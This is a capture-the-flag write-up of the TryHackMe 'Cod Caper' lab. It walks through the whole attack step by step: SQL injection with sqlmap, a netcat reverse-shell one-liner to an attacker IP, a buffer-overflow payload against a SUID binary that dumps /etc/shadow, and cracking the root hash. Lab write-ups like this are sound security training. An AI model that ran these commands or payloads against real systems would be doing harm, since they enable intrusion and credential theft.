# TryHackMe: The Cod Caper — Writeup

> **Difficulty:** Easy  
> **Description:** A guided room taking you through infiltrating and exploiting a Linux system.  
> **Tools used:** nmap, gobuster, sqlmap, netcat, LinEnum, GDB, John the Ripper

---

## Task 1 — Host Enumeration

Initial scan to discover open ports and services:

```bash
nmap -sC -sV -oN scan.txt <TARGET_IP>
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80   | HTTP    | Apache httpd 2.4.18 (Ubuntu) |

- **Open ports:** 2
- **HTTP title:** Apache2 Ubuntu Default Page: It works
- **SSH version:** OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

---

## Task 2 — Web Enumeration

Used Gobuster to brute-force directories and files:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt -x php,html,txt
```

**Key finding:**

```
/administrator.php    (Status: 200) [Size: 409]
```

This is a login form with `username` and `password` fields.

---

## Task 3 — SQL Injection with sqlmap

Tested the login form for SQL injection:

```bash
sqlmap -u "http://<TARGET_IP>/administrator.php" --forms --dbs --batch --risk=3 --level=5
```

**Findings:**

- The `username` POST parameter is vulnerable to **3 types** of SQL injection:
  1. **Boolean-based blind**
  2. **Error-based** (MySQL >= 5.0 FLOOR)
  3. **Time-based blind** (SLEEP)

- Backend DBMS: **MySQL >= 5.0**
- Databases: `information_schema`, `mysql`, `performance_schema`, `sys`, **`users`**

Dumped the `users` database:

```bash
sqlmap -u "http://<TARGET_IP>/administrator.php" --forms -D users --dump --batch
```

**Credentials found:**

| username | password   |
|----------|------------|
| pingudad | secretpass |

---

## Task 4 — Command Execution

Logged in at `/administrator.php` with the extracted credentials. The admin panel reveals a **command execution form** that POSTs to `2591c98b70119fe624898b1e424b5e91.php`.

Verified RCE:

```bash
curl -s -X POST "http://<TARGET_IP>/2591c98b70119fe624898b1e424b5e91.php" -d "cmd=whoami"
# Output: www-data
```

### Reverse Shell

**Attacker (listener):**

```bash
nc -lvnp 4444
```

**Via the command form:**

```bash
curl -s -X POST "http://<TARGET_IP>/2591c98b70119fe624898b1e424b5e91.php" \
  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f"
```

Got a shell as `www-data`. Stabilized with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Task 5 — Finding the SSH Password

From `/etc/passwd`, two user accounts have a login shell:

- `pingu` (uid 1002)
- `papa` (uid 1000)

Used the `find` command to locate the password file:

```bash
find / -name "pass*" 2>/dev/null
```

**Found:** `/var/hidden/pass`

```bash
cat /var/hidden/pass
# pinguapingu
```

SSH login:

```bash
ssh pingu@<TARGET_IP>
# Password: pinguapingu
```

---

## Task 6 — LinEnum & SUID Enumeration

Transferred LinEnum to the target:

```bash
# Attacker
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
scp LinEnum.sh pingu@<TARGET_IP>:/tmp

# Target
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh
```

**Key finding — SUID binary:**

```
-r-sr-xr-x 1 root papa 7516 Jan 16 2020 /opt/secret/root
```

This is a custom SUID binary owned by root — a prime target for privilege escalation.

---

## Task 7 — Binary Exploitation (Buffer Overflow)

### Analyzing the Binary

Opened the binary in GDB (pwndbg):

```bash
gdb /opt/secret/root
```

Found the `shell()` function address:

```
pwndbg> print shell
$1 = {<text variable, no debug info>} 0x80484cb <shell>
```

The `shell()` function executes `cat /etc/shadow` with root privileges.

### Exploitation

The buffer overflow offset is **44 bytes**. Overwriting EIP with the address of `shell()`:

```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

**Breakdown:**
- `"A"*44` — fills the buffer + padding up to EIP
- `"\xcb\x84\x04\x08"` — address of `shell()` in little-endian format

This dumps `/etc/shadow`, revealing the root password hash.

### Cracking the Hash

Root hash extracted:

```
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
```

Hash type: **SHA-512** (`$6$`)

```bash
echo '$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Root password:** `love2fish`

```bash
su root
# Password: love2fish
```

---

## Kill Chain Summary

```
nmap scan
  └── Port 80 open (Apache)
        └── Gobuster → /administrator.php
              └── sqlmap → pingudad:secretpass
                    └── Login → Command Execution panel
                          └── Reverse shell (www-data)
                                └── /var/hidden/pass → pinguapingu
                                      └── SSH as pingu
                                            └── LinEnum → SUID /opt/secret/root
                                                  └── Buffer Overflow → /etc/shadow
                                                        └── John → root:love2fish
                                                              └── ROOT!
```

---

## Lessons Learned

- **SQL Injection:** Always test login forms for SQLi — `sqlmap --forms` automates this.
- **Password reuse:** Database credentials and hidden files often contain SSH passwords.
- **SUID binaries:** Custom SUID files are high-priority targets for privilege escalation.
- **Buffer Overflow:** Even basic stack-based overflows with known offsets can lead to full root compromise.
- **Defense takeaways:** Hash storage in plaintext, lack of input validation, and unnecessary SUID permissions all contributed to full system compromise.
